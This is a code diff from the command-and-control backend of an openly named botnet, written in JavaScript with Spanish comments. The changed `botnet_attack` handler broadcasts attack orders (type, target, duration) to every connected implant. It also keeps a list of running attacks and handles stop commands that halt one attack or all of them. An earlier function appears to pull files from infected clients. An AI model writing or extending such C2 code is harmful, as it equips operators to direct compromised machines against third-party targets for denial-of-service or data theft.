@@ -156,24 +156,50 @@ const downloadFiles=async (clients, req, res = response) => {
     }, 5000);
 };
 
-const botnet_attack=(clients, req, res = response)=>{
-    
-    
-/*     const msgHandler = (msg) => {
-        try {
-            const parsed = JSON.parse(msg);
-            res.status(200).json(parsed);
-        } catch (e) {
-            res.status(200).json({ result: msg });
-        }
-        client.off('message', msgHandler);
-    }; */
+const botnet_attack=(clients, attacks_running, req, res = response)=>{
 
+    
+    const attack_name = Object.keys(req.body)[0];
+    const attack_value=req.body[attack_name];
+    const attack=req.body
+
+    /* 
+        Si es un ataque:
+        {
+            attack:{
+                type:"tipo_ataque",
+                target: "objetivo",
+                duration: segundos
+            }
+        }
+
+        Si se detienen todos los ataques:
+        {
+            stop_attack:''
+        }
+    
+        Si se detienen un ataque específico:
+        {
+            stop_attack:'tipo_ataque'
+        }
+    */
+    
     for (const [clientid, client] of clients) {
-       // client.on('message', msgHandler);
         client.send(JSON.stringify(req.body));
-        
     }
+
+
+    // Si el mensaje del implante hacia el backend falla, el controller limpia el estado de running_attacks en este punto
+    if(attack_name === 'stop_attack' ){
+        if(attack_value.length === 0){
+            attacks_running.attacks=[]
+        }else{
+            attacks_running.attacks = attacks_running.attacks.filter(a =>
+                a.attack_type !== attack_value
+            );
+        }
+    }
+ 
     return res.status(200).json({msg:"Sended"})
 
 
